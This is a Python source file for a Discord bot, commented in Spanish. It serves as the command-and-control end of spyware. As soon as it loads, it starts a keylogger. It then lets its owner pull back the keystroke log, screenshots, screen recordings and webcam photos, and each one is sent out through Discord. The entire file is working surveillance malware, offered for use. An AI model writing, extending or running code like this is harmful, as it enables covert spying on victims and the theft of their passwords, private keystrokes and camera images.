# Librerias #

import discord
from discord.ext import commands
import os
import dotenv
import keylogger as key 
import syware as video   
import asyncio

#discor
dotenv.load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')

if not TOKEN:
    raise ValueError("no se encontro el token ")

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

key_logger = key.Keylog()
key_logger.pathCheck()
key_logger.start_listening() 

@bot.event
async def on_ready():
    print(f'Bot {bot.user.name} conectado!')
    await bot.change_presence(activity=discord.Game(name="Escribe !ayuda"))

@bot.command()
@commands.is_owner()
async def logs(ctx):
    "se nesesita permisos del admin"
    try:
        await ctx.send(file=discord.File(key_logger.keyslog))
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
@commands.is_owner()
async def capture(ctx):
    "se nesesita permisos del admin"
    try:
        screen = video.screenshot()
        screen.checkpath()
        screen.takensave()
        await ctx.send(file=discord.File(f"takensend/image/Imagen {screen.datetime}.jpg"))
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
@commands.is_owner()
async def record(ctx):
    "se nesesita permisos del admin "
    try:
        await ctx.send("Grabando video")
        recorder = video.videotake()
        recorder.checkpath()
        recorder.takensavev()
        await ctx.send(file=discord.File(f"takensend/video/Video {recorder.datetime}.avi"))
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
@commands.is_owner()
async def webcam(ctx):
    "se nesesita permisos del admin "
    try:
        await ctx.send("tomando pantallaso")
        cam = video.camtake()
        cam.checkpath()
        cam.takecamphoto()
        await ctx.send(file=discord.File(f"takensend/image/Camara {cam.datetime}.jpg"))
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.NotOwner):
        await ctx.send("no tienes permisos de admin")
    else:
        print(f"Error: {error}")

if __name__ == "__main__":
    bot.run(TOKEN)
       
